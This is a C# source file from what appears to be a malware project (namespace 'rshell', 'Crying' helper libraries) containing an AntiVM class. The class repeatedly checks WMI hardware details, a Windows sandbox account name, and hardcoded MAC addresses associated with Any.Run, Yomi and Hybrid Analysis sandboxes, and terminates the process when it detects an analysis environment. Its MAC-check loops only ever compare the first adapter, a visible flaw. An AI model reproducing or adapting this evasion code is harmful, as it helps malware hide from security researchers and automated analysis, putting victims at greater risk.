using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using Crying.Reader;
using Crying.Helpers;
using System.Threading;
using System.Diagnostics;
using System.ServiceProcess;
using System.Collections.Generic;
using static Crying.Helpers.Common;
using System.Net.NetworkInformation;
using System.Management;
using System.Collections;

namespace rshell
{
    class AntiVM
    {
        public static void Runner()
        {
            while (true)
            {
                foreach (var item in new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
                {

                    const string MICROSOFTCORPORATION = "microsoft corporation";
                    const string VMWARE = "vmware";
                    const string OC = "Oracle Corporation";
                    const string VB = "VirtualBox";
                    const string anyrunmac = "52:54:00:4A:04:AF";
                    const string Yomi = "54:56:00:7F:00:01";
                    const string Hybrid = "0A:00:27:3E:B0:1E";

                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    string model = item["Model"].ToString().ToLower();

                    if (ProgramStarter.Starter()) { Environment.FailFast(null); }
                    if (Environment.MachineName == "WDAGUtilityAccount") { Environment.FailFast(null); }
                    if (item["Model"] != null)
                    {
                        if (model.Contains(MICROSOFTCORPORATION) || model.Contains(VMWARE)) { Environment.FailFast(null); }
                        if (model.Contains(MICROSOFTCORPORATION) || model.Contains(VB)) { Environment.FailFast(null); }

                    }
                    if (manufacturer.Contains(MICROSOFTCORPORATION) || manufacturer.Contains(VMWARE)) { Environment.FailFast(null); }
                    if (manufacturer.Contains(MICROSOFTCORPORATION) || manufacturer.Contains(OC)) { Environment.FailFast(null); }

                    ArrayList ary = new ArrayList(); //Anyrun Sandbox mac addresses

                    ManagementClass manager = new ManagementClass("Win32_NetworkAdapterConfiguration");
                    foreach (ManagementObject obj in manager.GetInstances())
                    {

                        if ((bool)obj["IPEnabled"])
                        {
                            ary.Add(obj["MacAddress"].ToString()); //We throw mac addresses into the array.
                        }
                    }

                    //Checks mac addresses
                    for (int i = 0; i < ary.Count; i++)
                    {
                        if (anyrunmac != ary[0].ToString())
                        {
                            if (i == ary.Count - 1)
                            {

                            }

                        }
                        else
                        {
                            Environment.FailFast(null);
                        }
                    }
                    for (int i = 0; i < ary.Count; i++)
                    {
                        if (Yomi != ary[0].ToString())
                        {
                            if (i == ary.Count - 1)
                            {
                                Console.WriteLine("");
                            }

                        }
                        else
                        {
                            Environment.FailFast(null);
                        }
                    }

                    for (int i = 0; i < ary.Count; i++)
                    {
                        if (Hybrid != ary[0].ToString())
                        {
                            if (i == ary.Count - 1)
                            {
                                Console.WriteLine("");
                            }

                        }
                        else
                        {
                            Environment.FailFast(null);
                        }
                    }
                    Thread.Sleep(100);
                }
            }
        }
    }
}
